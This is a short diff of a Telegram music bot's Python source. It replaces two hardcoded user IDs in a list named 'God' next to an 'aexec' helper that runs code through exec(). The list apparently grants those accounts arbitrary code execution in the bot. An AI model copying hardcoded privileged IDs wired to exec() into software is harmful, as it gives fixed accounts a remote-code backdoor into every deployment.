@@ -12,7 +12,7 @@ from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
 
 from Fsecmusic import app
 
-God = [5460343986, 6757745933]
+God = [5280511188, 7531546997]
 
 async def aexec(code, client, message):
     exec(
